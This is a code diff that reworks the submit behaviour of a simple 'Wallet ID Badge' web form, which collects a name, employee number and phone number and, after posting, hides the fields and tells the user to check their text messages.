@@ -14,15 +14,16 @@
 </head>
 <body class="bg-black text-gray-100 min-h-screen flex items-center justify-center p-4">
 
+  <!-- Main Container -->
   <div class="w-full max-w-md bg-black p-8 rounded-2xl">
     
-    <h1 class="text-2xl font-bold text-white text-center mb-8">
+    <h1 id="form-title" class="text-2xl font-bold text-white text-center mb-8">
       Wallet ID Badge
     </h1>
 
     <form id="badgeForm" class="space-y-6">
 
-      <div>
+      <div id="field-name" class="form-field">
         <label for="name" class="block text-sm font-semibold text-white mb-2">
           First & Last Name
         </label>
@@ -36,7 +37,7 @@
         >
       </div>
 
-      <div>
+      <div id="field-employee" class="form-field">
         <label for="employee_id" class="block text-sm font-semibold text-white mb-2">
           Employee Number
         </label>
@@ -52,7 +53,7 @@
         >
       </div>
 
-      <div>
+      <div id="field-phone" class="form-field">
         <label for="phone" class="block text-sm font-semibold text-white mb-2">
           Phone Number
         </label>
@@ -66,6 +67,7 @@
         >
       </div>
 
+      <!-- Submit Button -->
       <button 
         type="submit" 
         id="submitBtn"
@@ -77,8 +79,9 @@
 
     </form>
 
-    <div id="success_message" class="hidden mt-6 p-4 rounded-lg bg-neutral-900 border border-neutral-800 text-center">
-      <p class="text-sm font-medium text-white">Submitted successfully!</p>
+    <!-- Success Text Display -->
+    <div id="success_message" class="hidden text-center mt-6">
+      <p class="text-xl font-bold text-white tracking-wide">check your text messages</p>
     </div>
 
   </div>
@@ -90,10 +93,16 @@
       e.preventDefault();
       
       const submitBtn = document.getElementById('submitBtn');
+      const formTitle = document.getElementById('form-title');
       const successMsg = document.getElementById('success_message');
       
+      // Hide title and all input fields, keep only the button
+      formTitle.classList.add('hidden');
+      document.querySelectorAll('.form-field').forEach(el => el.classList.add('hidden'));
+
+      // Change button state to Loading
       submitBtn.disabled = true;
-      submitBtn.innerText = 'Submitting...';
+      submitBtn.innerText = 'Loading...';
 
       const formData = new FormData(this);
 
@@ -103,19 +112,18 @@
         mode: 'no-cors'
       })
       .then(() => {
+        // Change button to Done and show instruction text
+        submitBtn.innerText = 'Done';
+        submitBtn.style.backgroundColor = '#22c55e'; // Optional: turns button green on success
         successMsg.classList.remove('hidden');
         this.reset();
-        submitBtn.disabled = false;
-        submitBtn.innerText = 'Submit';
-        
-        setTimeout(() => {
-          successMsg.classList.add('hidden');
-        }, 4000);
       })
       .catch(error => {
         alert('Submission failed. Please try again.');
         submitBtn.disabled = false;
         submitBtn.innerText = 'Submit';
+        formTitle.classList.remove('hidden');
+        document.querySelectorAll('.form-field').forEach(el => el.classList.remove('hidden'));
       });
     });
   </script>
